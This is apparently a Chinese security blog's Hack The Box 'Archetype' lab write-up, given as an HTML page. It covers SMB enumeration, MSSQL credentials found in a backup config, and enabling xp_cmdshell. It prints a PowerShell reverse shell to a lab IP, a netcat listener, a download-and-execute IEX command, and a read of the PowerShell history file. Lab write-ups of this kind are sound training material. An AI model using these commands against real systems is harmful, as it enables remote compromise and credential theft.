@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    
+<meta charset="utf-8">
+
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+<title>Hackthebox-Archetype - F0rmat的博客 | 专注于网络攻防和信息安全</title>
+
+<meta name="description" content="0x01 前言 挺久没接触技术，最近准备考OSCP，就先拿Hack The Box里面的题目先练练手。
+这个靶机是Starting Point Lab的机器Archetype，收获还是挺多的，记录一下。
+0x02 过程 拿到ip先上nmap：
+我刚开始扫的时候还没有3389这个端口，应该是free的共享靶机，大家都可以用的，穷啊～
+看到445可以用smb工具来连接查看下有什么共享信息：
+尝试了下面的共享只有backups这个disk可以进去，里面还有一个配置文件，直接get下来看看有什么：
+看到了mssql的连接信息，应该就是对应nmap扫描出来的1433端口：
+但这里出现了一个问题，靶机是共享的，1433端口被搞坏了。。。：
+剩下的具体可以看下这篇文章：https://medium.com/@dpgg/hackthebox-archetype-starting-point-391af7b10fea
+0x03 总结 1、smbclient命令
+smbclient(选项)(参数)
+-B&amp;lt;ip地址&amp;gt;：传送广播数据包时所用的IP地址； -d&amp;lt;排错层级&amp;gt;：指定记录文件所记载事件的详细程度； -E：将信息送到标准错误输出设备； -h：显示帮助； -i&amp;lt;范围&amp;gt;：设置NetBIOS名称范围； -I&amp;lt;IP地址&amp;gt;：指定服务器的IP地址； -l&amp;lt;记录文件&amp;gt;：指定记录文件的名称； -L：显示服务器端所分享出来的所有资源； -M&amp;lt;NetBIOS名称&amp;gt;：可利用WinPopup协议，将信息送给选项中所指定的主机； -n&amp;lt;NetBIOS名称&amp;gt;：指定用户端所要使用的NetBIOS名称； -N：不用询问密码； -O&amp;lt;连接槽选项&amp;gt;：设置用户端TCP连接槽的选项； -p&amp;lt;TCP连接端口&amp;gt;：指定服务器端TCP连接端口编号； -R&amp;lt;名称解析顺序&amp;gt;：设置NetBIOS名称解析的顺序； -s&amp;lt;目录&amp;gt;：指定smb.conf所在的目录； -t&amp;lt;服务器字码&amp;gt;：设置用何种字符码来解析服务器端的文件名称； -T&amp;lt;tar选项&amp;gt;：备份服务器端分享的全部文件，并打包成tar格式的文件； -U&amp;lt;用户名称&amp;gt;：指定用户名称； -w&amp;lt;工作群组&amp;gt;：指定工作群组名称。 连接服务器smbclient //192.168.0.1/tmp -U username%password
+2、mssql开启xp_cmdshell
+EXEC sp_configure &amp;#39;Show Advanced Options&amp;#39;, 1;	\\使用sp_configure系统存储过程，设置服务器配置选项，将Show Advanced Options设置为1时，允许修改数据库的高级配置选项 reconfigure;	\\确认上面的操作 sp_configure;	\\查看当前sp_configure配置情况 EXEC sp_configure &amp;#39;xp_cmdshell&amp;#39;, 1	\\使用sp_configure系存储过程，启用xp_cmdshell参数，来允许SQL Server调用操作系统命令 reconfigure;	\\确认上面的操作 xp_cmdshell &amp;#34;whoami&amp;#34; \\在靶机上调用cmdshell执行whoami 3、使用mssql的xp_cmdshell反弹shell" /><meta name="keywords"
+  content="F0rmat, 信息安全, 网络安全, 红蓝攻防, 渗透测试, bypass, waf, 注入, 黑客" />
+
+
+<link rel="stylesheet" href="https://getshe11.com/css/main.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.12/src/css/lightgallery.css">
+
+
+
+<meta property="og:title" content="Hackthebox-Archetype" />
+<meta property="og:description" content="0x01 前言 挺久没接触技术，最近准备考OSCP，就先拿Hack The Box里面的题目先练练手。
+这个靶机是Starting Point Lab的机器Archetype，收获还是挺多的，记录一下。
+0x02 过程 拿到ip先上nmap：
+我刚开始扫的时候还没有3389这个端口，应该是free的共享靶机，大家都可以用的，穷啊～
+看到445可以用smb工具来连接查看下有什么共享信息：
+尝试了下面的共享只有backups这个disk可以进去，里面还有一个配置文件，直接get下来看看有什么：
+看到了mssql的连接信息，应该就是对应nmap扫描出来的1433端口：
+但这里出现了一个问题，靶机是共享的，1433端口被搞坏了。。。：
+剩下的具体可以看下这篇文章：https://medium.com/@dpgg/hackthebox-archetype-starting-point-391af7b10fea
+0x03 总结 1、smbclient命令
+smbclient(选项)(参数)
+-B&lt;ip地址&gt;：传送广播数据包时所用的IP地址； -d&lt;排错层级&gt;：指定记录文件所记载事件的详细程度； -E：将信息送到标准错误输出设备； -h：显示帮助； -i&lt;范围&gt;：设置NetBIOS名称范围； -I&lt;IP地址&gt;：指定服务器的IP地址； -l&lt;记录文件&gt;：指定记录文件的名称； -L：显示服务器端所分享出来的所有资源； -M&lt;NetBIOS名称&gt;：可利用WinPopup协议，将信息送给选项中所指定的主机； -n&lt;NetBIOS名称&gt;：指定用户端所要使用的NetBIOS名称； -N：不用询问密码； -O&lt;连接槽选项&gt;：设置用户端TCP连接槽的选项； -p&lt;TCP连接端口&gt;：指定服务器端TCP连接端口编号； -R&lt;名称解析顺序&gt;：设置NetBIOS名称解析的顺序； -s&lt;目录&gt;：指定smb.conf所在的目录； -t&lt;服务器字码&gt;：设置用何种字符码来解析服务器端的文件名称； -T&lt;tar选项&gt;：备份服务器端分享的全部文件，并打包成tar格式的文件； -U&lt;用户名称&gt;：指定用户名称； -w&lt;工作群组&gt;：指定工作群组名称。 连接服务器smbclient //192.168.0.1/tmp -U username%password
+2、mssql开启xp_cmdshell
+EXEC sp_configure &#39;Show Advanced Options&#39;, 1;	\\使用sp_configure系统存储过程，设置服务器配置选项，将Show Advanced Options设置为1时，允许修改数据库的高级配置选项 reconfigure;	\\确认上面的操作 sp_configure;	\\查看当前sp_configure配置情况 EXEC sp_configure &#39;xp_cmdshell&#39;, 1	\\使用sp_configure系存储过程，启用xp_cmdshell参数，来允许SQL Server调用操作系统命令 reconfigure;	\\确认上面的操作 xp_cmdshell &#34;whoami&#34; \\在靶机上调用cmdshell执行whoami 3、使用mssql的xp_cmdshell反弹shell" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://getshe11.com/post/archetype/" />
+<meta property="article:published_time" content="2020-12-06T15:30:00+00:00" />
+<meta property="article:modified_time" content="2020-12-06T15:30:00+00:00" />
+<meta itemprop="name" content="Hackthebox-Archetype">
+<meta itemprop="description" content="0x01 前言 挺久没接触技术，最近准备考OSCP，就先拿Hack The Box里面的题目先练练手。
+这个靶机是Starting Point Lab的机器Archetype，收获还是挺多的，记录一下。
+0x02 过程 拿到ip先上nmap：
+我刚开始扫的时候还没有3389这个端口，应该是free的共享靶机，大家都可以用的，穷啊～
+看到445可以用smb工具来连接查看下有什么共享信息：
+尝试了下面的共享只有backups这个disk可以进去，里面还有一个配置文件，直接get下来看看有什么：
+看到了mssql的连接信息，应该就是对应nmap扫描出来的1433端口：
+但这里出现了一个问题，靶机是共享的，1433端口被搞坏了。。。：
+剩下的具体可以看下这篇文章：https://medium.com/@dpgg/hackthebox-archetype-starting-point-391af7b10fea
+0x03 总结 1、smbclient命令
+smbclient(选项)(参数)
+-B&lt;ip地址&gt;：传送广播数据包时所用的IP地址； -d&lt;排错层级&gt;：指定记录文件所记载事件的详细程度； -E：将信息送到标准错误输出设备； -h：显示帮助； -i&lt;范围&gt;：设置NetBIOS名称范围； -I&lt;IP地址&gt;：指定服务器的IP地址； -l&lt;记录文件&gt;：指定记录文件的名称； -L：显示服务器端所分享出来的所有资源； -M&lt;NetBIOS名称&gt;：可利用WinPopup协议，将信息送给选项中所指定的主机； -n&lt;NetBIOS名称&gt;：指定用户端所要使用的NetBIOS名称； -N：不用询问密码； -O&lt;连接槽选项&gt;：设置用户端TCP连接槽的选项； -p&lt;TCP连接端口&gt;：指定服务器端TCP连接端口编号； -R&lt;名称解析顺序&gt;：设置NetBIOS名称解析的顺序； -s&lt;目录&gt;：指定smb.conf所在的目录； -t&lt;服务器字码&gt;：设置用何种字符码来解析服务器端的文件名称； -T&lt;tar选项&gt;：备份服务器端分享的全部文件，并打包成tar格式的文件； -U&lt;用户名称&gt;：指定用户名称； -w&lt;工作群组&gt;：指定工作群组名称。 连接服务器smbclient //192.168.0.1/tmp -U username%password
+2、mssql开启xp_cmdshell
+EXEC sp_configure &#39;Show Advanced Options&#39;, 1;	\\使用sp_configure系统存储过程，设置服务器配置选项，将Show Advanced Options设置为1时，允许修改数据库的高级配置选项 reconfigure;	\\确认上面的操作 sp_configure;	\\查看当前sp_configure配置情况 EXEC sp_configure &#39;xp_cmdshell&#39;, 1	\\使用sp_configure系存储过程，启用xp_cmdshell参数，来允许SQL Server调用操作系统命令 reconfigure;	\\确认上面的操作 xp_cmdshell &#34;whoami&#34; \\在靶机上调用cmdshell执行whoami 3、使用mssql的xp_cmdshell反弹shell">
+<meta itemprop="datePublished" content="2020-12-06T15:30:00+00:00" />
+<meta itemprop="dateModified" content="2020-12-06T15:30:00+00:00" />
+<meta itemprop="wordCount" content="127">
+
+
+
+<meta itemprop="keywords" content="hackthebox," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Hackthebox-Archetype"/>
+<meta name="twitter:description" content="0x01 前言 挺久没接触技术，最近准备考OSCP，就先拿Hack The Box里面的题目先练练手。
+这个靶机是Starting Point Lab的机器Archetype，收获还是挺多的，记录一下。
+0x02 过程 拿到ip先上nmap：
+我刚开始扫的时候还没有3389这个端口，应该是free的共享靶机，大家都可以用的，穷啊～
+看到445可以用smb工具来连接查看下有什么共享信息：
+尝试了下面的共享只有backups这个disk可以进去，里面还有一个配置文件，直接get下来看看有什么：
+看到了mssql的连接信息，应该就是对应nmap扫描出来的1433端口：
+但这里出现了一个问题，靶机是共享的，1433端口被搞坏了。。。：
+剩下的具体可以看下这篇文章：https://medium.com/@dpgg/hackthebox-archetype-starting-point-391af7b10fea
+0x03 总结 1、smbclient命令
+smbclient(选项)(参数)
+-B&lt;ip地址&gt;：传送广播数据包时所用的IP地址； -d&lt;排错层级&gt;：指定记录文件所记载事件的详细程度； -E：将信息送到标准错误输出设备； -h：显示帮助； -i&lt;范围&gt;：设置NetBIOS名称范围； -I&lt;IP地址&gt;：指定服务器的IP地址； -l&lt;记录文件&gt;：指定记录文件的名称； -L：显示服务器端所分享出来的所有资源； -M&lt;NetBIOS名称&gt;：可利用WinPopup协议，将信息送给选项中所指定的主机； -n&lt;NetBIOS名称&gt;：指定用户端所要使用的NetBIOS名称； -N：不用询问密码； -O&lt;连接槽选项&gt;：设置用户端TCP连接槽的选项； -p&lt;TCP连接端口&gt;：指定服务器端TCP连接端口编号； -R&lt;名称解析顺序&gt;：设置NetBIOS名称解析的顺序； -s&lt;目录&gt;：指定smb.conf所在的目录； -t&lt;服务器字码&gt;：设置用何种字符码来解析服务器端的文件名称； -T&lt;tar选项&gt;：备份服务器端分享的全部文件，并打包成tar格式的文件； -U&lt;用户名称&gt;：指定用户名称； -w&lt;工作群组&gt;：指定工作群组名称。 连接服务器smbclient //192.168.0.1/tmp -U username%password
+2、mssql开启xp_cmdshell
+EXEC sp_configure &#39;Show Advanced Options&#39;, 1;	\\使用sp_configure系统存储过程，设置服务器配置选项，将Show Advanced Options设置为1时，允许修改数据库的高级配置选项 reconfigure;	\\确认上面的操作 sp_configure;	\\查看当前sp_configure配置情况 EXEC sp_configure &#39;xp_cmdshell&#39;, 1	\\使用sp_configure系存储过程，启用xp_cmdshell参数，来允许SQL Server调用操作系统命令 reconfigure;	\\确认上面的操作 xp_cmdshell &#34;whoami&#34; \\在靶机上调用cmdshell执行whoami 3、使用mssql的xp_cmdshell反弹shell"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+</head>
+
+<body>
+    <div class="header-placeholder"></div>
+    
+    <header class="header">
+        <div class="wrapper">
+    <div id="sidebar-toggle">TOC</div>
+    
+    <a class="site-title" href="https://getshe11.com/.">F0rmat</a>
+    
+    <nav class="site-nav">
+        <a class="page-link" href="/">Home</a><a class="page-link" href="/post/">Category</a>
+    </nav>
+</div>
+
+    </header>
+
+    
+    <div class="page-content">
+        <div class="wrapper">
+            
+            <div class="col-main">
+                <div class="post">
+    
+    <header class="post-header">
+        <h1 class="post-title">Hackthebox-Archetype</h1>
+        <p class="post-meta">Dec 06, 2020</p>
+    </header>
+    <article class="post-content">
+        
+        
+        
+        
+        
+        
+        <h1 id="0x01-前言">0x01 前言</h1>
+<p>挺久没接触技术，最近准备考OSCP，就先拿Hack The Box里面的题目先练练手。</p>
+<p>这个靶机是Starting Point Lab的机器Archetype，收获还是挺多的，记录一下。</p>
+<h1 id="0x02-过程">0x02 过程</h1>
+<p>拿到ip先上nmap：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Archetype/1.png" alt=""></p>
+<p>我刚开始扫的时候还没有3389这个端口，应该是free的共享靶机，大家都可以用的，穷啊～</p>
+<p>看到445可以用smb工具来连接查看下有什么共享信息：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Archetype/2.png" alt=""></p>
+<p>尝试了下面的共享只有backups这个disk可以进去，里面还有一个配置文件，直接get下来看看有什么：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Archetype/3.png" alt=""></p>
+<p>看到了mssql的连接信息，应该就是对应nmap扫描出来的1433端口：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Archetype/4.png" alt=""></p>
+<p>但这里出现了一个问题，靶机是共享的，1433端口被搞坏了。。。：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Archetype/1.png" alt=""></p>
+<p>剩下的具体可以看下这篇文章：https://medium.com/@dpgg/hackthebox-archetype-starting-point-391af7b10fea</p>
+<h1 id="0x03-总结">0x03 总结</h1>
+<p>1、smbclient命令</p>
+<p><code>smbclient(选项)(参数)</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">-B&lt;ip地址&gt;：传送广播数据包时所用的IP地址；
+-d&lt;排错层级&gt;：指定记录文件所记载事件的详细程度；
+-E：将信息送到标准错误输出设备；
+-h：显示帮助；
+-i&lt;范围&gt;：设置NetBIOS名称范围；
+-I&lt;IP地址&gt;：指定服务器的IP地址；
+-l&lt;记录文件&gt;：指定记录文件的名称；
+-L：显示服务器端所分享出来的所有资源；
+-M&lt;NetBIOS名称&gt;：可利用WinPopup协议，将信息送给选项中所指定的主机；
+-n&lt;NetBIOS名称&gt;：指定用户端所要使用的NetBIOS名称；
+-N：不用询问密码；
+-O&lt;连接槽选项&gt;：设置用户端TCP连接槽的选项；
+-p&lt;TCP连接端口&gt;：指定服务器端TCP连接端口编号；
+-R&lt;名称解析顺序&gt;：设置NetBIOS名称解析的顺序；
+-s&lt;目录&gt;：指定smb.conf所在的目录；
+-t&lt;服务器字码&gt;：设置用何种字符码来解析服务器端的文件名称；
+-T&lt;tar选项&gt;：备份服务器端分享的全部文件，并打包成tar格式的文件；
+-U&lt;用户名称&gt;：指定用户名称；
+-w&lt;工作群组&gt;：指定工作群组名称。
+</code></pre></div><p>连接服务器<code>smbclient //192.168.0.1/tmp  -U username%password</code></p>
+<p>2、mssql开启xp_cmdshell</p>
+<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">EXEC</span> <span class="n">sp_configure</span> <span class="s1">&#39;Show Advanced Options&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">;</span>			<span class="err">\\使用</span><span class="n">sp_configure系统存储过程</span><span class="err">，设置服务器配置选项，将</span><span class="k">Show</span> <span class="n">Advanced</span> <span class="n">Options设置为1时</span><span class="err">，允许修改数据库的高级配置选项</span>
+<span class="n">reconfigure</span><span class="p">;</span>											<span class="err">\\确认上面的操作</span>
+<span class="n">sp_configure</span><span class="p">;</span>											<span class="err">\\查看当前</span><span class="n">sp_configure配置情况</span>
+<span class="k">EXEC</span> <span class="n">sp_configure</span> <span class="s1">&#39;xp_cmdshell&#39;</span><span class="p">,</span> <span class="mi">1</span>						<span class="err">\\使用</span><span class="n">sp_configure系存储过程</span><span class="err">，启用</span><span class="n">xp_cmdshell参数</span><span class="err">，来允许</span><span class="k">SQL</span> <span class="n">Server调用操作系统命令</span>
+<span class="n">reconfigure</span><span class="p">;</span>											<span class="err">\\确认上面的操作</span>
+<span class="n">xp_cmdshell</span> <span class="s2">&#34;whoami&#34;</span> 									<span class="err">\\在靶机上调用</span><span class="n">cmdshell执行whoami</span>
+</code></pre></div><p>3、使用mssql的xp_cmdshell反弹shell</p>
+<p>建立一个powershell的反向shell文件shell.ps1</p>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$client</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">Sockets</span><span class="p">.</span><span class="n">TCPClient</span><span class="p">(</span><span class="s2">&#34;10.10.14.33&#34;</span><span class="p">,</span><span class="n">443</span><span class="p">);</span><span class="nv">$stream</span> <span class="p">=</span> <span class="nv">$client</span><span class="p">.</span><span class="n">GetStream</span><span class="p">();</span><span class="no">[byte[]]</span><span class="nv">$bytes</span> <span class="p">=</span> <span class="n">0</span><span class="p">..</span><span class="n">65535</span><span class="p">|%{</span><span class="n">0</span><span class="p">};</span><span class="k">while</span><span class="p">((</span><span class="nv">$i</span> <span class="p">=</span> <span class="nv">$stream</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$bytes</span><span class="p">.</span><span class="n">Length</span><span class="p">))</span> <span class="o">-ne</span> <span class="n">0</span><span class="p">){;</span><span class="nv">$data</span> <span class="p">=</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">.</span><span class="n">ASCIIEncoding</span><span class="p">).</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="n">0</span><span class="p">,</span> <span class="nv">$i</span><span class="p">);</span><span class="nv">$sendback</span> <span class="p">=</span> <span class="p">(</span><span class="nb">iex </span><span class="nv">$data</span> <span class="n">2</span><span class="p">&gt;&amp;</span><span class="n">1</span> <span class="p">|</span> <span class="nb">Out-String</span> <span class="p">);</span><span class="nv">$sendback2</span> <span class="p">=</span> <span class="nv">$sendback</span> <span class="p">+</span> <span class="s2">&#34;# &#34;</span><span class="p">;</span><span class="nv">$sendbyte</span> <span class="p">=</span> <span class="p">(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">);</span><span class="nv">$stream</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span><span class="n">0</span><span class="p">,</span><span class="nv">$sendbyte</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span><span class="nv">$stream</span><span class="p">.</span><span class="n">Flush</span><span class="p">()};</span><span class="nv">$client</span><span class="p">.</span><span class="n">Close</span><span class="p">()</span>
+
+</code></pre></div><p>使用python搭建一个迷你http服务器</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">python3 -m http.server 80
+nc -nvvlp 443 //监听
+</code></pre></div><p>数据库执行命令:</p>
+<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">xp_cmdshell</span> <span class="s2">&#34;powershell &#34;</span><span class="n">IEX</span> <span class="p">(</span><span class="k">New</span><span class="o">-</span><span class="k">Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="err">\</span><span class="s2">&#34;http://10.10.14.33/shell.ps1\&#34;</span><span class="p">);</span><span class="s2">&#34;
+</span></code></pre></div><p>4、访问PowerShell历史记录文件</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">type C:\Users\username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+</code></pre></div><p>5、使用psexec</p>
+<p>官方文档：https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec</p>
+<p>也可以使用Impacket的psexec.p y user@ip</p>
+
+    </article>
+
+    
+    <div class="prevnext">
+        
+
+
+
+<ul class="prevnext">
+    
+    <li>上一篇：
+        <a href="https://getshe11.com/post/oopsie/">
+            Hackthebox-Oopsie
+        </a>
+    </li>
+    
+    
+    <li>下一篇：
+        <a href="https://getshe11.com/post/shield/">
+            Hackthebox-Shield
+        </a>
+    </li>
+    
+</ul>
+
+    </div>
+    
+    <div class="post-comments">
+        
+  
+  
+
+  
+    <script src="https://utteranc.es/client.js"
+            repo="F0r3at/Getshe11.com"
+            issue-term="pathname"
+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>
+
+    </div>
+</div>
+            </div>
+            
+            <div class="col-second">
+                <div class="col-box col-box-author">
+    <img class="avatar" src="../../images/avatar.jpg" alt="F0rmat">
+    <div class="col-box-title name">F0rmat</div>
+    <p>Stay Hungry, Stay Foolish.</p>
+    <p class="contact">
+        <a href="http://github.com/F0r3at">Github</a>
+    </p>
+</div>
+
+<div class="col-box">
+    <div class="col-box-title">Newest Posts</div>
+    <ul class="post-list">
+        
+        <li>
+            <a href="https://getshe11.com/post/pd-chrome-3d/" class="post-link">关于Kali2020安装Parallels Tools后Chrome显示空白</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/install-parallels-tools-on-kali-linux-2020.4/" class="post-link">Kali Linux 2020.4安装Parallels Tools</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/pathfinder/" class="post-link">Hackthebox-Pathfinder</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/domain-security/" class="post-link">Windows认证与域渗透</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/shield/" class="post-link">Hackthebox-Shield</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/archetype/" class="post-link">Hackthebox-Archetype</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/oopsie/" class="post-link">Hackthebox-Oopsie</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/vaccine/" class="post-link">Hackthebox-Vaccine</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/bc-penetration-diary/" class="post-link">Bc站渗透日记</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/maccms8-latest-command-execution-vulnerability/" class="post-link">Maccms8最新命令执行漏洞</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/seacms9.92-from-variable-override-to-getshell/" class="post-link">Seacms9.92从变量覆盖到getshell</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/seacms-front-desk-getshell/" class="post-link">Seacms&lt;=9.92前台Getshell</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/a-difficult-penetration-process/" class="post-link">一次艰难的渗透提权过程</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/an-app-distribution-system-upload-vulnerability/" class="post-link">某云分发APP上传漏洞</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/analysis-of-php-deserialization-vulnerabilities/" class="post-link">浅析PHP反序列化漏洞</a>
+        </li>
+        
+    </ul>
+</div>
+
+<div class="col-box post-toc hide">
+    <div class="col-box-title">TOC</div>
+</div>
+            </div>
+        </div>
+    </div>
+    
+    <footer class="footer">
+        <div class="wrapper">
+    © 2021    <a href="https://getshe11.com">F0rmat</a>
+</div>
+    </footer>
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@1.11.0/dist/jquery.min.js"></script>
+
+<script src="/js/easybook.js"></script>
+
+<script src="/js/lazysizes.min.js"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.12/dist/js/lightgallery-all.min.js"></script>
+<script src="/js/figure.js"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-XXXXXXXX-X', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+</body>
+
+</html>
